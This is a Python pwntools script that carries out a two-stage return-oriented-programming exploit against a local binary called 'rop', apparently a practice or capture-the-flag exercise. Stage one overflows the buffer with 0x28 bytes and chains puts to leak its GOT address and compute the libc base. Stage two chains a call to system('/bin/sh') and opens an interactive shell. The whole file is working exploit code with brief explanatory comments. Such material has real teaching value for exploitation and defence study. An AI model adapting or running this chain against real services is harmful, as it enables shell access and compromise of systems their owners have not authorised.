from pwn import *

# Parse our binary file
elf = ELF("./rop")

# Initialize pwn ROP engine
rop = ROP(elf)

# Create a debug process and load the libc
p = gdb.debug("./rop",'''
break main
continue''')

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# Stage 1: Infering libc address

puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
main_plt = elf.symbols['main']

# Find pop_rdi gadgets
pop_rdi = rop.find_gadget(['pop rdi','ret'])[0]
payload = b'A'*0x28
# Build first chain
rop_chain = [   pop_rdi,    # puts prints the content of a pointer stored in rdi, the content is the address of the puts function
                puts_got,   # address of a GOT entry for puts
                puts_plt,   # address of the puts function 
                main_plt    # address of the main function
            ]

rop_chain = b''.join([p64(i) for i in rop_chain])
first_payload = payload + rop_chain
print(p.recvline())
p.sendline(first_payload)
received = p.recvline().strip()
puts_addr = u64(received.ljust(8,b'\x00'))
log.success("leaked puts addr: "+ hex(puts_addr))
libc.address = puts_addr-libc.symbols['puts']


# Stage 2: Exploit the bin/sh
bin_sh = next(libc.search(b'/bin/sh\x00'))
system = libc.symbols['system']
exit = libc.symbols['exit']

# Build second chain
rop_chain = [   pop_rdi,
                bin_sh,
                system,
                exit
            ]

rop_chain = b''.join([p64(i) for i in rop_chain])
second_payload = payload + rop_chain
print(p.recvline())
p.sendline(second_payload)
p.interactive()
